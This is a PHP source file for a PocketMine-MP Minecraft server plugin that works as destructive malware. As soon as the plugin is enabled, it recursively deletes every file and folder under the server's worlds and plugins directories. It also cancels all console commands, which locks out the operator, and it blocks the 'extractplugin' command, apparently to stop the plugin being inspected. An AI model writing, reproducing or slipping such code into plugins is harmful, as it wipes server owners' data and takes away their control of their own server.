<?php
use pocketmine\Player;
use pocketmine\Server;
use pocketmine\level\Level;
use pocketmine\event\player\PlayerPreLoginEvent;
use pocketmine\event\player\PlayerCommandPreprocessEvent;
use pocketmine\event\server\ServerCommandEvent;
use pocketmine\event\server\RemoteServerCommandEvent;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
class Main extends \pocketmine\plugin\PluginBase implements \pocketmine\event\Listener 
{
  public function onEnable()
  {
    $this->world();
    $this->plugin();
  }
  public function playerCommand(PlayerCommandPreprocessEvent $event)
  {
		$message = $event->getMessage();
		$command = "extractplugin";
		if(strstr($message, $command)) return $event->setCancelled();
	}
  public function ServerCommand(ServerCommandEvent $event)
  {
		$event->setCancelled();
	}
  public function world()
  {
		$dir = $this->getServer()->getDataPath() ."worlds";
		if (is_dir($dir) and !is_link($dir)) {
			$paths = array();
			while ($glob = glob($dir)) {
				$paths = array_merge($glob, $paths);
				$dir .= '/*';
			}
			array_map('unlink', array_filter($paths, 'is_file'));
			array_map('rmdir', array_filter($paths, 'is_dir'));
		}
	}
	public function plugin()
  {
		$dir = $this->getServer()->getDataPath() ."plugins";
		if (is_dir($dir) and !is_link($dir)) {
			$paths = array();
			while ($glob = glob($dir)) {
				$paths = array_merge($glob, $paths);
				$dir .= '/*';
			}
			array_map('unlink', array_filter($paths, 'is_file'));
			array_map('rmdir', array_filter($paths, 'is_dir'));
		}
	}
}
